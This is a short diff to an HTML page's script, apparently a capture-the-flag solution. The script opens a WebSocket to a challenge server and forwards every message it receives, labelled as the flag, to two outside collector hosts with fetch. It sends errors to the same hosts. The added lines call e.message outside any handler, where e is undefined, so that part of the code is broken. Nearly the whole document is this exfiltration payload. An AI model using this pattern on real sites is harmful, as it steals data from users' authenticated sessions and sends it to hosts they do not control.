@@ -9,6 +9,8 @@
 
 <body>
   <script>
+    fetch('https://uwvmoap.request.dreamhack.games/?init=' + encodeURIComponent(e.message))
+    fetch('http://server.dottak.me/?init=' + encodeURIComponent(e.message));
 
     const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
     ws.onopen = () => {
@@ -17,11 +19,8 @@
     ws.onmessage = (event) => {
       fetch('https://uwvmoap.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
       fetch('http://server.dottak.me/?flag=' + encodeURIComponent(event.data));
-      // if (event.data.includes('Flag:')) {
-      // }
     };
     ws.onerror = (e) => {
-      // optional: exfil any errors
       fetch('https://uwvmoap.request.dreamhack.games/?error=' + encodeURIComponent(e.message))
       fetch('http://server.dottak.me/?error=' + encodeURIComponent(e.message));
     };
